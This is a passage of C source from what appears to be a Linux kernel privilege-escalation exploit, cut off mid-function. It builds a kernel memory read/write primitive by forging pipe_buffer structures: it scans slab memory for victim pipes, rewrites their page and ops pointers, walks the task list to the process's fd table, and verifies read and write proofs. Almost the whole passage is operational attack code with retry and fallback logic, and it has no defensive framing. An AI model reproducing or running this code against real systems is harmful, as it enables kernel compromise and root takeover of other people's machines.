  unsigned char want[OSS_PIPE_COUNT + 1];
  if (pipe_index < 0 || pipe_index >= OSS_PIPE_COUNT || length > sizeof(got) ||
      pipe(duplicate) != 0) {
    return 0;
  }
  ssize_t copied;
  do {
    copied = tee(g_reclaim_pipes[pipe_index][0], duplicate[1], length,
                 SPLICE_F_NONBLOCK);
  } while (copied < 0 && errno == EINTR);
  int ok = copied == (ssize_t)length && read_full(duplicate[0], got, length);
  close(duplicate[0]);
  close(duplicate[1]);
  if (!ok) {
    return 0;
  }
  fill_pipe_marker(want, (size_t)pipe_index, length);
  return memcmp(got, want, length) == 0;
}

static int validate_pipe_ring(int pipe_index, size_t expected_len,
                              const char **reason) {
  /* These pipes are empty after creation and receive exactly one marker write.
   * Therefore exact readable content plus active slot zero proves the expected
   * one-buffer ring state: tail=0, head=1. tee() keeps it non-destructive. */
  int capacity = fcntl(g_reclaim_pipes[pipe_index][0], F_GETPIPE_SZ);
  int readable = -1;
  if (capacity != OSS_PIPE_SLOTS * (int)OSS_PAGE_SIZE) {
    *reason = "capacity";
    return 0;
  }
  if (ioctl(g_reclaim_pipes[pipe_index][0], FIONREAD, &readable) != 0 ||
      readable != (int)expected_len) {
    *reason = "readable";
    return 0;
  }
  if (!peek_pipe_marker(pipe_index, expected_len)) {
    *reason = "marker";
    return 0;
  }
  *reason = "ok";
  return 1;
}

static int is_structural_pipe_candidate(const struct oss_pipe_buffer *buffer,
                                        uint64_t anon_ops) {
  return buffer->page >= OSS_VMEMMAP_START &&
         buffer->page < OSS_VMEMMAP_END && buffer->offset == 0 &&
         buffer->len != 0 && buffer->len <= OSS_PIPE_COUNT &&
         buffer->ops == anon_ops && buffer->flags == OSS_PIPE_CAN_MERGE &&
         buffer->private == 0;
}

static int try_pipe_slab_candidates(int fd, uint64_t slab_base,
                                    size_t slab_index, enum pipe_error *error) {
  oss_diag_checkpoint("pipe-slab-read-start");
  unsigned char *slab = malloc(OSS_ORDER3_SIZE);
  if (!slab) {
    *error = PIPE_E_VICTIM_SCAN;
    return 0;
  }
  for (uint64_t off = 0; off < OSS_ORDER3_SIZE;
       off += OSS_PIPE_SCAN_CHUNK) {
    if (!oss_kernel_read(fd, slab_base + off, slab + off,
                         OSS_PIPE_SCAN_CHUNK)) {
      free(slab);
      *error = PIPE_E_VICTIM_SCAN;
      return 0;
    }
  }
  oss_diag_checkpoint("pipe-slab-read-done");

  uint64_t anon_ops = g_kernel_base + OSS_ANON_PIPE_BUF_OPS_OFF;
  size_t structural = 0;
  size_t ring_valid = 0;
  size_t proofs = 0;
  size_t page_candidates[OSS_PIPE_MAX_SLABS] = {0};
  for (uint64_t off = 0;
       off + sizeof(struct oss_pipe_buffer) <= OSS_ORDER3_SIZE; off += 8) {
    struct oss_pipe_buffer candidate;
    memcpy(&candidate, slab + off, sizeof(candidate));
    if (is_structural_pipe_candidate(&candidate, anon_ops)) {
      page_candidates[off / OSS_PAGE_SIZE]++;
    }
  }
  for (size_t page = 0; page < OSS_PIPE_MAX_SLABS; page++) {
    fprintf(stderr,
            "[pipe_rw] selection page slab=%zu page=%zu base=%016llx "
            "candidates=%zu\n",
            slab_index, page,
            (unsigned long long)(slab_base + page * OSS_PAGE_SIZE),
            page_candidates[page]);
  }
  for (uint64_t off = 0;
       off + sizeof(struct oss_pipe_buffer) <= OSS_ORDER3_SIZE; off += 8) {
    struct oss_pipe_buffer before;
    memcpy(&before, slab + off, sizeof(before));
    if (!is_structural_pipe_candidate(&before, anon_ops)) {
      continue;
    }
    structural++;

    uint64_t object_offset = off % OSS_PIPE_OBJECT_SIZE;
    if (object_offset % sizeof(struct oss_pipe_buffer) != 0) {
      fprintf(stderr,
              "[pipe_rw] candidate reject slab=%zu off=%04llx reason=slot-align\n",
              slab_index, (unsigned long long)off);
      continue;
    }
    size_t slot = object_offset / sizeof(struct oss_pipe_buffer);
    if (slot != 0) {
      fprintf(stderr,
              "[pipe_rw] candidate reject slab=%zu off=%04llx slot=%zu "
              "reason=not-active-slot\n",
              slab_index, (unsigned long long)off, slot);
      continue;
    }

    int index = (int)before.len - 1;
    const char *ring_reason = NULL;
    if (!validate_pipe_ring(index, before.len, &ring_reason)) {
      fprintf(stderr,
              "[pipe_rw] candidate reject slab=%zu off=%04llx slot=%zu "
              "pipe=%d reason=ring-%s\n",
              slab_index, (unsigned long long)off, slot, index, ring_reason);
      continue;
    }
    ring_valid++;
    *error = PIPE_E_VICTIM_CONFIRM;
    unsigned char confirmation = pipe_marker_byte((size_t)index, before.len);
    if (!write_full(g_reclaim_pipes[index][1], &confirmation, 1)) {
      fprintf(stderr,
              "[pipe_rw] candidate reject slab=%zu off=%04llx slot=%zu "
              "pipe=%d reason=confirm-write errno=%d\n",
              slab_index, (unsigned long long)off, slot, index, errno);
      continue;
    }
    struct oss_pipe_buffer after;
    uint64_t victim = slab_base + off;
    if (!oss_kernel_read(fd, victim, &after, sizeof(after)) ||
        after.page != before.page || after.offset != before.offset ||
        after.len != before.len + 1 || after.ops != before.ops ||
        after.flags != before.flags || after.private != before.private) {
      fprintf(stderr,
              "[pipe_rw] candidate reject slab=%zu off=%04llx slot=%zu "
              "pipe=%d reason=confirm-state\n",
              slab_index, (unsigned long long)off, slot, index);
      continue;
    }
    if (!validate_pipe_ring(index, after.len, &ring_reason)) {
      fprintf(stderr,
              "[pipe_rw] candidate reject slab=%zu off=%04llx slot=%zu "
              "pipe=%d reason=confirmed-ring-%s\n",
              slab_index, (unsigned long long)off, slot, index, ring_reason);
      continue;
    }
    proofs++;
    g_pipe_page_base = slab_base;
    g_victim_addr = victim;
    g_victim_pipe = index;
    fprintf(stderr,
            "[pipe_rw] candidate test slab=%zu/%016llx off=%04llx "
            "victim=%016llx ring=head:1,tail:0,slot:%zu pipe=%d len=%u "
            "original_page=%016llx forged_page=%016llx\n",
            slab_index, (unsigned long long)slab_base,
            (unsigned long long)off, (unsigned long long)victim, slot, index,
            after.len,
            (unsigned long long)before.page,
            (unsigned long long)direct_to_page(g_payload_base + OSS_PROOF_OFF));
    char proof_stage[96];
    snprintf(proof_stage, sizeof(proof_stage),
             "pipe-proof-start slab=%zu off=%llx pipe=%d len=%u", slab_index,
             (unsigned long long)off, index, after.len);
    oss_diag_checkpoint(proof_stage);
    if (prove_pipe_rw(fd, error)) {
      oss_diag_checkpoint("pipe-proof-ok");
      fprintf(stderr,
              "[pipe_rw] selection accept slab=%zu pipe=%d candidates=%zu "
              "ring_valid=%zu proofs=%zu\n",
              slab_index, index, structural, ring_valid, proofs);
      free(slab);
      return 1;
    }
    fprintf(stderr,
            "[pipe_rw] candidate reject slab=%zu off=%04llx slot=%zu pipe=%d "
            "reason=%s\n",
            slab_index, (unsigned long long)off, slot, index,
            pipe_error_name(*error));
    oss_diag_checkpoint("pipe-proof-miss");
    if (*error == PIPE_E_RESTORE) {
      free(slab);
      return 0;
    }
    g_victim_addr = 0;
    g_victim_pipe = -1;
  }
  fprintf(stderr,
          "[pipe_rw] selection slab=%zu base=%016llx candidates=%zu "
          "ring_valid=%zu proofs=%zu result=miss\n",
          slab_index, (unsigned long long)slab_base, structural, ring_valid,
          proofs);
  free(slab);
  return 0;
}

static int fd_set_nonblock(int fd, int *saved_flags) {
  *saved_flags = fcntl(fd, F_GETFL, 0);
  return *saved_flags >= 0 &&
         fcntl(fd, F_SETFL, *saved_flags | O_NONBLOCK) == 0;
}

static int fd_restore_flags(int fd, int saved_flags) {
  return fcntl(fd, F_SETFL, saved_flags) == 0;
}

static int pipe_io_bounded(int fd, void *buffer, size_t length, int writing) {
  unsigned char *cursor = buffer;
  uint64_t deadline_ms = monotonic_ms() + OSS_PIPE_IO_TIMEOUT_MS;
  while (length != 0) {
    ssize_t n = writing ? write(fd, cursor, length) : read(fd, cursor, length);
    if (n > 0) {
      cursor += n;
      length -= (size_t)n;
      continue;
    }
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
      int remaining_ms = deadline_remaining_ms(deadline_ms);
      if (remaining_ms <= 0) {
        return 0;
      }
      struct pollfd pfd = {
          .fd = fd,
          .events = writing ? POLLOUT : POLLIN,
      };
      int poll_ret = poll(&pfd, 1, remaining_ms);
      if (poll_ret < 0 && errno == EINTR) {
        continue;
      }
      if (poll_ret <= 0 || (pfd.revents & (POLLERR | POLLNVAL))) {
        return 0;
      }
      continue;
    }
    return 0;
  }
  return 1;
}

static int pipe_rw_read_once(int fd, uint64_t addr, void *buf, size_t len) {
  if (!g_victim_addr || g_victim_pipe < 0 || !is_direct_ptr(addr) || !len ||
      (addr & OSS_PAGE_MASK) + len > OSS_PAGE_SIZE) {
    return 0;
  }
  struct oss_pipe_buffer saved;
  if (!oss_kernel_read(fd, g_victim_addr, &saved, sizeof(saved))) {
    return 0;
  }
  int saved_flags;
  int pipe_fd = g_reclaim_pipes[g_victim_pipe][0];
  if (!fd_set_nonblock(pipe_fd, &saved_flags)) {
    return 0;
  }
  struct oss_pipe_buffer forged = saved;
  forged.page = direct_to_page(addr);
  forged.offset = (uint32_t)(addr & OSS_PAGE_MASK);
  forged.len = (uint32_t)len + 1;
  forged.ops = g_kernel_base + OSS_ANON_PIPE_BUF_OPS_OFF;
  forged.flags = OSS_PIPE_CAN_MERGE;
  forged.private = 0;
  if (!oss_kernel_write(fd, g_victim_addr, &forged, sizeof(forged))) {
    fd_restore_flags(pipe_fd, saved_flags);
    return 0;
  }
  int ok = pipe_io_bounded(pipe_fd, buf, len, 0);
  int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
  int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
  atomic_store_explicit(&g_io_restore_failed, !restored, memory_order_release);
  return ok && restored && flags_restored;
}

static int pipe_rw_write_once(int fd, uint64_t addr, const void *buf,
                              size_t len) {
  if (!g_victim_addr || g_victim_pipe < 0 || !is_direct_ptr(addr) || !len ||
      (addr & OSS_PAGE_MASK) + len > OSS_PAGE_SIZE) {
    return 0;
  }
  struct oss_pipe_buffer saved;
  if (!oss_kernel_read(fd, g_victim_addr, &saved, sizeof(saved))) {
    return 0;
  }
  int saved_flags;
  int pipe_fd = g_reclaim_pipes[g_victim_pipe][1];
  if (!fd_set_nonblock(pipe_fd, &saved_flags)) {
    return 0;
  }
  struct oss_pipe_buffer forged = saved;
  forged.page = direct_to_page(addr);
  forged.offset = (uint32_t)(addr & OSS_PAGE_MASK);
  forged.len = 0;
  forged.ops = g_kernel_base + OSS_ANON_PIPE_BUF_OPS_OFF;
  forged.flags = OSS_PIPE_CAN_MERGE;
  forged.private = 0;
  if (!oss_kernel_write(fd, g_victim_addr, &forged, sizeof(forged))) {
    fd_restore_flags(pipe_fd, saved_flags);
    return 0;
  }
  int ok = pipe_io_bounded(pipe_fd, (void *)buf, len, 1);
  int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
  int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
  atomic_store_explicit(&g_io_restore_failed, !restored, memory_order_release);
  return ok && restored && flags_restored;
}

static int prove_pipe_rw(int fd, enum pipe_error *error) {
  uint64_t proof_addr = g_payload_base + OSS_PROOF_OFF;
  static const char read_string[] = OSS_PROOF_READ_TAG;
  static const char write_string[] = OSS_PROOF_WRITE_TAG;
  char string_readback[sizeof(read_string)];
  _Static_assert(sizeof(read_string) == 0x17, "read proof length");
  _Static_assert(sizeof(write_string) == 0x17, "write proof length");
  memset(string_readback, 0, sizeof(string_readback));
  atomic_store_explicit(&g_io_restore_failed, 0, memory_order_release);
  errno = 0;
  if (!oss_kernel_write(fd, proof_addr, read_string, sizeof(read_string)) ||
      !pipe_rw_read_once(fd, proof_addr, string_readback,
                         sizeof(string_readback)) ||
      memcmp(string_readback, read_string, sizeof(read_string)) != 0) {
    uint64_t got = 0, want = 0;
    memcpy(&got, string_readback, sizeof(got));
    memcpy(&want, read_string, sizeof(want));
    fprintf(stderr,
            "[pipe_rw] proof miss step=read-string errno=%d got=%016llx "
            "want=%016llx victim=%016llx pipe=%d\n",
            errno, (unsigned long long)got, (unsigned long long)want,
            (unsigned long long)g_victim_addr, g_victim_pipe);
    *error = atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)
                 ? PIPE_E_RESTORE
                 : PIPE_E_READ_PROOF;
    return 0;
  }
  errno = 0;
  if (!pipe_rw_write_once(fd, proof_addr, write_string,
                          sizeof(write_string))) {
    fprintf(stderr,
            "[pipe_rw] proof miss step=write-string errno=%d "
            "victim=%016llx pipe=%d\n",
            errno, (unsigned long long)g_victim_addr, g_victim_pipe);
    *error = atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)
                 ? PIPE_E_RESTORE
                 : PIPE_E_WRITE_PROOF;
    return 0;
  }
  memset(string_readback, 0, sizeof(string_readback));
  errno = 0;
  if (!oss_kernel_read(fd, proof_addr, string_readback,
                       sizeof(string_readback)) ||
      memcmp(string_readback, write_string, sizeof(write_string)) != 0) {
    uint64_t got = 0, want = 0;
    memcpy(&got, string_readback, sizeof(got));
    memcpy(&want, write_string, sizeof(want));
    fprintf(stderr,
            "[pipe_rw] proof miss step=verify-string errno=%d got=%016llx "
            "want=%016llx\n",
            errno, (unsigned long long)got, (unsigned long long)want);
    *error = PIPE_E_WRITE_PROOF;
    return 0;
  }

  uint64_t read_tag = OSS_PROOF_READ;
  uint64_t readback = 0;
  errno = 0;
  if (!oss_kernel_write(fd, proof_addr, &read_tag, sizeof(read_tag)) ||
      !pipe_rw_read_once(fd, proof_addr, &readback, sizeof(readback)) ||
      readback != read_tag) {
    fprintf(stderr,
            "[pipe_rw] proof miss step=read-u64 errno=%d got=%016llx "
            "want=%016llx victim=%016llx pipe=%d\n",
            errno, (unsigned long long)readback,
            (unsigned long long)read_tag,
            (unsigned long long)g_victim_addr, g_victim_pipe);
    *error = atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)
                 ? PIPE_E_RESTORE
                 : PIPE_E_READ_PROOF;
    return 0;
  }
  uint64_t write_tag = OSS_PROOF_WRITE;
  readback = 0;
  errno = 0;
  if (!pipe_rw_write_once(fd, proof_addr, &write_tag, sizeof(write_tag)) ||
      !oss_kernel_read(fd, proof_addr, &readback, sizeof(readback)) ||
      readback != write_tag) {
    fprintf(stderr,
            "[pipe_rw] proof miss step=write-u64 errno=%d got=%016llx "
            "want=%016llx victim=%016llx pipe=%d\n",
            errno, (unsigned long long)readback,
            (unsigned long long)write_tag,
            (unsigned long long)g_victim_addr, g_victim_pipe);
    *error = atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)
                 ? PIPE_E_RESTORE
                 : PIPE_E_WRITE_PROOF;
    return 0;
  }
  *error = PIPE_E_NONE;
  return 1;
}

static int establish_pipe_rw(int fd, enum pipe_error *error) {
  if (!is_direct_ptr(g_pipe_page_base) || !is_direct_ptr(g_payload_base)) {
    *error = PIPE_E_PREPARE;
    return 0;
  }
  uint64_t slabs[OSS_PIPE_MAX_SLABS];
  size_t slab_count = 0;
  if (!collect_pipe_slabs(fd, slabs, &slab_count)) {
    *error = PIPE_E_CACHE_SELECT;
    return 0;
  }
  if (!populate_pipe_markers()) {
    *error = PIPE_E_MARKER_WRITE;
    return 0;
  }
  *error = PIPE_E_VICTIM_SCAN;
  for (size_t i = 0; i < slab_count; i++) {
    if (try_pipe_slab_candidates(fd, slabs[i], i + 1, error)) {
      g_installed = 1;
      return 1;
    }
    if (*error == PIPE_E_RESTORE) {
      return 0;
    }
  }
  return 0;
}

/* Tier 2: deterministic pipe_buffer resolution. Walks init_task.tasks to the
 * calling process, then its fd table, to one of the reclaim pipes'
 * pipe_inode_info, and reads the exact kernel address of the pipe_buffer at the
 * current tail. Replaces the KernelSnitch leak + slab scan with a pointer walk
 * over the already-live AAR primitive. Every hop is validated; any failure
 * returns 0 so the caller falls back to the KernelSnitch path. */
static uint64_t walk_find_task(int fd, pid_t want_pid) {
  uint64_t list_head = g_kernel_base + OSS_INIT_TASK_OFF + OSS_TASK_TASKS_OFF;
  fprintf(stderr, "[pipe_rw] det: task walk head=%016llx pid=%d\n",
          (unsigned long long)list_head, want_pid);
  uint64_t node = oss_kernel_read64(fd, list_head);
  fprintf(stderr, "[pipe_rw] det: task walk first=%016llx\n",
          (unsigned long long)node);
  for (int i = 0; i < 16384; i++) {
    if (node == UINT64_MAX || node == 0 || node == list_head) {
      break;
    }
    uint64_t task = node - OSS_TASK_TASKS_OFF;
    if (!is_direct_ptr(task)) {
      break;
    }
    uint32_t pid = 0;
    if (!oss_kernel_read(fd, task + OSS_TASK_PID_OFF, &pid, sizeof(pid))) {
      break;
    }
    if ((pid_t)pid == want_pid) {
      return task;
    }
    node = oss_kernel_read64(fd, node);
  }
  return 0;
}

static int resolve_pipe_victim_deterministic(int fd) {
  pid_t mypid = getpid();
  uint64_t task = walk_find_task(fd, mypid);
  if (!task) {
    fprintf(stderr, "[pipe_rw] det: task pid=%d not found in task list\n", mypid);
    return 0;
  }
  uint64_t files = oss_kernel_read64(fd, task + OSS_TASK_FILES_OFF);
  uint64_t fdt = is_direct_ptr(files)
                     ? oss_kernel_read64(fd, files + OSS_FILES_FDT_OFF)
                     : 0;
  uint64_t fd_array = is_direct_ptr(fdt)
                          ? oss_kernel_read64(fd, fdt + OSS_FDTABLE_FD_OFF)
                          : 0;
  if (!is_direct_ptr(fd_array)) {
    fprintf(stderr, "[pipe_rw] det: fd table walk failed task=%016llx\n",
            (unsigned long long)task);
    return 0;
  }
  uint64_t anon_ops = g_kernel_base + OSS_ANON_PIPE_BUF_OPS_OFF;
  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
    int pipe_rd = g_reclaim_pipes[i][0];
    if (pipe_rd < 0) {
      continue;
    }
    uint64_t file = oss_kernel_read64(fd, fd_array + (uint64_t)pipe_rd * 8);
    if (!is_direct_ptr(file)) {
      continue;
    }
    uint64_t pinfo = oss_kernel_read64(fd, file + OSS_FILE_PRIVATE_DATA_OFF);
    if (!is_direct_ptr(pinfo)) {
      continue;
    }
    uint32_t tail = 0, ring = 0;
    if (!oss_kernel_read(fd, pinfo + OSS_PIPE_TAIL_OFF, &tail, sizeof(tail)) ||
        !oss_kernel_read(fd, pinfo + OSS_PIPE_RING_SIZE_OFF, &ring,
                         sizeof(ring)) ||
        ring == 0 || (ring & (ring - 1)) != 0) {
      continue;
    }
    uint64_t bufs = oss_kernel_read64(fd, pinfo + OSS_PIPE_BUFS_OFF);
    if (!is_direct_ptr(bufs)) {
      continue;
    }
    uint64_t victim =
        bufs + (uint64_t)(tail & (ring - 1)) * OSS_PIPE_BUF_STRIDE;
    struct oss_pipe_buffer candidate;
    if (!oss_kernel_read(fd, victim, &candidate, sizeof(candidate))) {
      continue;
    }
    if (!is_structural_pipe_candidate(&candidate, anon_ops) ||
        candidate.len != (uint32_t)(i + 1)) {
      continue;
    }
    uint64_t slab_base = victim & ~(OSS_ORDER3_SIZE - 1);
    if (!is_direct_ptr(slab_base)) {
      continue;
    }
    g_pipe_page_base = slab_base;
    g_victim_addr = victim;
    g_victim_pipe = (int)i;
    fprintf(stderr,
            "[pipe_rw] det: pipe=%zu victim=%016llx bufs=%016llx tail=%u "
            "ring=%u len=%u slab=%016llx\n",
            i, (unsigned long long)victim, (unsigned long long)bufs, tail, ring,
            candidate.len, (unsigned long long)slab_base);
    return 1;
  }
  fprintf(stderr, "[pipe_rw] det: no reclaim pipe resolved to a live buffer\n");
  return 0;
}

int oss_pipe_rw_pending(void) {
  ensure_initialized();
  return atomic_load_explicit(&g_prepare_request, memory_order_acquire) != 0;
}

int oss_pipe_rw_service_pending(void) {
  ensure_initialized();
  if (atomic_exchange_explicit(&g_prepare_active, 1,
                               memory_order_acq_rel)) {
    return 0;
  }
  if (!atomic_exchange_explicit(&g_prepare_request, 0,
                                memory_order_acq_rel)) {
    atomic_store_explicit(&g_prepare_active, 0, memory_order_release);
    return 0;
  }
  int timeout_ms = atomic_load_explicit(&g_prepare_timeout_ms,
                                        memory_order_acquire);
  if (timeout_ms <= 0 || timeout_ms > OSS_PIPE_PREPARE_TIMEOUT_MS) {
    timeout_ms = OSS_PIPE_PREPARE_TIMEOUT_MS;
  }
  g_pipe_page_base = prepare_pipe_page(timeout_ms, &g_prepare_diag);
  int ok = g_pipe_page_base != 0;
  atomic_store_explicit(&g_prepare_ok, ok, memory_order_release);
  atomic_store_explicit(&g_prepare_done, 1, memory_order_release);
  atomic_store_explicit(&g_prepare_active, 0, memory_order_release);
  return ok ? 1 : -1;
}

void oss_pipe_rw_reset(void) {
  ensure_initialized();
  if (g_holder_pid > 0) {
    kill_child(&g_holder_pid);
  }
  close_pipe_bank(g_drain_pipes, OSS_PIPE_DRAIN_COUNT);
  close_pipe_bank(g_reclaim_pipes, OSS_PIPE_COUNT);
  g_pipe_page_base = 0;
  g_victim_addr = 0;
  g_kernel_base = 0;
  g_payload_base = 0;
  g_victim_pipe = -1;
  g_installed = 0;
  g_p0_oracle_ownership = P0_ORACLE_IDLE;
  g_p0_oracle_pipe = -1;
  atomic_store_explicit(&g_prepare_request, 0, memory_order_release);
  atomic_store_explicit(&g_prepare_done, 0, memory_order_release);
  atomic_store_explicit(&g_prepare_ok, 0, memory_order_release);
  atomic_store_explicit(&g_prepare_active, 0, memory_order_release);
  atomic_store_explicit(&g_prepare_timeout_ms, 0, memory_order_release);
  memset(&g_prepare_diag, 0, sizeof(g_prepare_diag));
}

int oss_prepare_p0_pipe_oracle(uint64_t *pipe_page_base) {
  ensure_initialized();
  if (!pipe_page_base) return 0;
  g_p0_oracle_ownership = P0_ORACLE_IDLE;
  g_p0_oracle_pipe = -1;
  struct pipe_attempt_diag diag;
  g_pipe_page_base = prepare_pipe_page(OSS_PIPE_PREPARE_TIMEOUT_MS, &diag);
  if (!is_direct_ptr(g_pipe_page_base)) return 0;
  unsigned char marker[OSS_PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
    for (size_t slot = 0; slot < 4; slot++) {
      if (!write_full(g_reclaim_pipes[i][1], marker, sizeof(marker))) {
        oss_pipe_rw_reset();
        return 0;
      }
    }
  }
  g_p0_oracle_ownership = P0_ORACLE_PREPARED;
  *pipe_page_base = g_pipe_page_base;
  return 1;
}

int oss_p0_pipe_oracle_capture(void *snapshots, size_t snapshot_size) {
  size_t stride = 0xfff;
  if (!snapshots || snapshot_size < OSS_PIPE_COUNT * stride) return 0;
  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
    if (!read_full(g_reclaim_pipes[i][0],
                   (unsigned char *)snapshots + i * stride, stride)) return 0;
  }
  return 1;
}

int oss_p0_pipe_oracle_advance(void) {
  unsigned char byte;
  for (size_t i = 0; i < OSS_PIPE_COUNT; i++)
    if (!read_full(g_reclaim_pipes[i][0], &byte, 1)) return 0;
  return 1;
}

int oss_p0_pipe_oracle_narrow(size_t pipe_index) {
  if (g_p0_oracle_ownership != P0_ORACLE_PREPARED ||
      pipe_index >= OSS_PIPE_COUNT) return 0;
  if (!kill_oracle_holder_confirmed()) return 0;
  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
    if (i == pipe_index) continue;
    if (g_reclaim_pipes[i][0] >= 0) close(g_reclaim_pipes[i][0]);
    if (g_reclaim_pipes[i][1] >= 0) close(g_reclaim_pipes[i][1]);
    g_reclaim_pipes[i][0] = g_reclaim_pipes[i][1] = -1;
  }
  if (g_holder_pid > 0 || g_reclaim_pipes[pipe_index][0] < 0 ||
      g_reclaim_pipes[pipe_index][1] < 0) return 0;
  g_p0_oracle_pipe = (int)pipe_index;
  g_p0_oracle_ownership = P0_ORACLE_NARROWED;
  return 1;
}

int oss_p0_pipe_oracle_release_only(void) {
  if (g_p0_oracle_ownership != P0_ORACLE_NARROWED ||
      g_p0_oracle_pipe < 0 || g_holder_pid > 0) return 0;
  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
    int should_be_open = i == (size_t)g_p0_oracle_pipe;
    if ((g_reclaim_pipes[i][0] >= 0) != should_be_open ||
        (g_reclaim_pipes[i][1] >= 0) != should_be_open) return 0;
  }
  int released = 1;
  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
    for (size_t end = 0; end < 2; end++) {
      int fd = g_reclaim_pipes[i][end];
      if (fd < 0) continue;
      if (close(fd) != 0 && errno != EINTR) released = 0;
      g_reclaim_pipes[i][end] = -1;
      errno = 0;
      if (fcntl(fd, F_GETFD) != -1 || errno != EBADF) released = 0;
    }
  }
  g_pipe_page_base = 0;
  g_p0_oracle_pipe = -1;
  g_p0_oracle_ownership = P0_ORACLE_IDLE;
  return released;
}

int oss_p0_pipe_oracle_release(void) {
  if (!oss_p0_pipe_oracle_release_only()) return 0;

  /* Closed do_sigreturn_fake_lock_route does not issue the final write using
   * the oracle bank. After the keeper acknowledges release it asks the main
   * loop for a fresh physrw bank, waits for its direct-map page, and only then
   * publishes sequence 2. This function is the adapter's release boundary, so
   * include that hand-off here while the v14 main loop is still servicing
   * prepare requests. */
  atomic_store_explicit(&g_prepare_done, 0, memory_order_release);
  atomic_store_explicit(&g_prepare_ok, 0, memory_order_release);
  atomic_store_explicit(&g_prepare_timeout_ms, OSS_PIPE_PREPARE_TIMEOUT_MS,
                        memory_order_release);
  atomic_store_explicit(&g_prepare_request, 1, memory_order_release);
  uint64_t fresh_deadline =
      monotonic_ms() + (uint64_t)OSS_PIPE_PREPARE_TIMEOUT_MS;
  while (!atomic_load_explicit(&g_prepare_done, memory_order_acquire)) {
    if (deadline_remaining_ms(fresh_deadline) <= 0) {
      /* Cancel only an unclaimed request. If the main loop already claimed
       * it, prepare_pipe_page() has the same bounded timeout; wait solely for
       * that cleanup to finish before touching its pipe banks. */
      (void)atomic_exchange_explicit(&g_prepare_request, 0,
                                     memory_order_acq_rel);
      while (atomic_load_explicit(&g_prepare_active, memory_order_acquire)) {
        usleep(10000);
      }
      fprintf(stderr, "[pipe_rw] fresh physrw prepare timed out\n");
      oss_pipe_rw_reset();
      return 0;
    }
    usleep(10000);
  }
  if (!atomic_load_explicit(&g_prepare_ok, memory_order_acquire) ||
      !is_direct_ptr(g_pipe_page_base)) {
    oss_pipe_rw_reset();
    return 0;
  }
  g_p0_oracle_ownership = P0_ORACLE_FRESH_READY;
  fprintf(stderr, "[pipe_rw] dentry preflight fresh physrw page=%016llx\n",
          (unsigned long long)g_pipe_page_base);
  /* Closed route settles the fresh reclaim for 100 ms before sequence 2. */
  usleep(100000);
  return 1;
}

int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
  ensure_initialized();
  if (g_installed) {
    return 1;
  }
  uint64_t install_started_ms = monotonic_ms();
  uint64_t install_deadline_ms = install_started_ms + OSS_PIPE_INSTALL_TIMEOUT_MS;
  int deterministic =
      (int)pipe_env_long_clamped("PIPE_DETERMINISTIC", 0, 0, 1);
  if (deterministic) {
    fprintf(stderr,
            "[pipe_rw] det disabled: task_struct read triggers hardened "
            "usercopy panic on target kernel; using legacy path\n");
    deterministic = 0;
  }
  for (int attempt = 1; attempt <= OSS_PIPE_ATTEMPTS; attempt++) {
    int remaining_ms = deadline_remaining_ms(install_deadline_ms);
    if (remaining_ms <= 0) {
      fprintf(stderr,
              "[pipe_rw] install failed reason=%s elapsed_ms=%llu\n",
              pipe_error_name(PIPE_E_INSTALL_TIMEOUT),
              (unsigned long long)(monotonic_ms() - install_started_ms));
      break;
    }
    int use_prepared_fresh =
        attempt == 1 &&
        g_p0_oracle_ownership == P0_ORACLE_FRESH_READY &&
        is_direct_ptr(g_pipe_page_base) &&
        atomic_load_explicit(&g_prepare_ok, memory_order_acquire);
    if (!use_prepared_fresh) {
      oss_pipe_rw_reset();
    } else {
      /* Consume exactly once. Later retries must allocate another clean bank. */
      g_p0_oracle_ownership = P0_ORACLE_IDLE;
    }
    g_kernel_base = kernel_base;
    g_payload_base = payload_base;
    if (deterministic) {
      enum pipe_error error = PIPE_E_PREPARE;
      uint64_t det_started_ms = monotonic_ms();
      fprintf(stderr, "[pipe_rw] det: preparing pipes attempt=%d/%d\n",
              attempt, OSS_PIPE_ATTEMPTS);
      int pipes_ready = create_pipe_bank(g_reclaim_pipes, OSS_PIPE_COUNT) &&
                        resize_pipe_bank(g_reclaim_pipes, OSS_PIPE_COUNT, OSS_PIPE_SLOTS) &&
                        populate_pipe_markers();
      if (pipes_ready) {
        fprintf(stderr, "[pipe_rw] det: resolving victim\n");
      }
      if (pipes_ready && resolve_pipe_victim_deterministic(fd) &&
          prove_pipe_rw(fd, &error)) {
        g_installed = 1;
        fprintf(stderr,
                "[pipe_rw] ready attempt=%d/%d page=%016llx victim=%016llx "
                "pipe=%d prepare_ms=%llu establish_ms=0 total_ms=%llu det=1\n",
                attempt, OSS_PIPE_ATTEMPTS,
                (unsigned long long)g_pipe_page_base,
                (unsigned long long)g_victim_addr, g_victim_pipe,
                (unsigned long long)(monotonic_ms() - det_started_ms),
                (unsigned long long)(monotonic_ms() - install_started_ms));
        return 1;
      }
      if (error == PIPE_E_RESTORE) {
        fprintf(stderr,
                "[pipe_rw] det terminal failure attempt=%d/%d reason=restore\n",
                attempt, OSS_PIPE_ATTEMPTS);
        return 0;
      }
      oss_pipe_rw_reset();
      fprintf(stderr,
              "[pipe_rw] det miss attempt=%d/%d reason=%s; fallback=legacy\n",
              attempt, OSS_PIPE_ATTEMPTS, pipe_error_name(error));
      g_kernel_base = kernel_base;
      g_payload_base = payload_base;
    }
    if (!use_prepared_fresh) {
      int prepare_timeout_ms = remaining_ms;
      if (prepare_timeout_ms > OSS_PIPE_PREPARE_TIMEOUT_MS) {
